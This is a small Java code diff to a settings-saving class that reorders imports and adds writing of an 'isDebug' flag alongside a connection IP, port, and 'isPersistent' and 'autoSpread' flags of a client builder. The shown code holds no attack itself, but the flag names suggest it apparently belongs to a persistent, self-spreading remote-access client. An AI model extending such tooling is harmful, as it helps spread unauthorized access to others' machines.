@@ -1,11 +1,11 @@
 package Server.Data;
 
 
+import KUMO.ClientBuilder;
 import Logger.Level;
 import Logger.Logger;
-import Server.KumoSettings;
-import KUMO.ClientBuilder;
 import Server.ClientObject;
+import Server.KumoSettings;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableMap;
 
@@ -48,7 +48,8 @@ public class PseudoBase implements Repository {
             writer.write(KumoSettings.CONNECTION_IP + "\n" + " ");
             writer.write("" + KumoSettings.PORT + "\n" + " ");
             writer.write("" + ClientBuilder.isPersistent + "\n" + " ");
-            writer.write("" + ClientBuilder.autoSpread);
+            writer.write("" + ClientBuilder.autoSpread + "\n" + " ");
+            writer.write("" + ClientBuilder.isDebug);
         } catch (IOException i) {
             Logger.log(Level.ERROR, i.toString());
         }
